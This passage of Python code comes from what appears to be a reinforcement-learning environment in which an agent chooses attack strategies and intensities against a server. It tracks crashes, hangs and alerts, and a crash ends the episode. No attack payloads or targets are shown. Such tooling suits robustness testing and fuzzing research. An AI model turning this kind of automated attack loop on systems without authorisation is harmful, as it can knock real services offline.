                obs[resp_idx + i] = min(self.response_counts.get(resp, 0) / 10.0, 1.0)

        # Health metrics
        health_idx = resp_idx + 10
        obs[health_idx] = self.crashes_detected / 10.0
        obs[health_idx + 1] = self.hangs_detected / 10.0
        obs[health_idx + 2] = self.alerts_triggered / 10.0
        obs[health_idx + 3] = self.step_count / self.max_steps

        return obs

    def reset(self, seed=None, options=None):
        if seed is not None:
            random.seed(seed)
            np.random.seed(seed)

        self.step_count = 0
        self.episode_reward = 0
        self.last_strategy = 0
        self.last_intensity = 0
        self.response_counts = {}

        # Take baseline health
        if self.server_monitor:
            try:
                self.baseline_health = self.server_monitor.check_health(full=True)
            except:
                pass

        return self._get_obs(), {}

    def step(self, action):
        strategy_idx = action // self.n_intensities
        intensity = action % self.n_intensities

        self.last_strategy = strategy_idx
        self.last_intensity = intensity

        strategy_name = ATTACK_STRATEGIES[strategy_idx][0]
        reward, info = self._execute_attack(strategy_name, intensity)

        # Track responses
        resp = info.get("response", "unknown")
        self.response_counts[resp] = self.response_counts.get(resp, 0) + 1

        if info.get("crash"):
            self.crashes_detected += 1
        if info.get("hang"):
            self.hangs_detected += 1
        if info.get("alert"):
            self.alerts_triggered += 1

        self.step_count += 1
        self.episode_reward += reward
        info["episode_reward"] = self.episode_reward

        truncated = self.step_count >= self.max_steps
        terminated = info.get("crash", False)

        return self._get_obs(), reward, terminated, truncated, info

    def render(self, mode="human"):
        strategy = ATTACK_STRATEGIES[self.last_strategy][0]
        print(f"Step {self.step_count} | {strategy} (intensity={self.last_intensity}) | "
              f"crashes={self.crashes_detected} hangs={self.hangs_detected}")
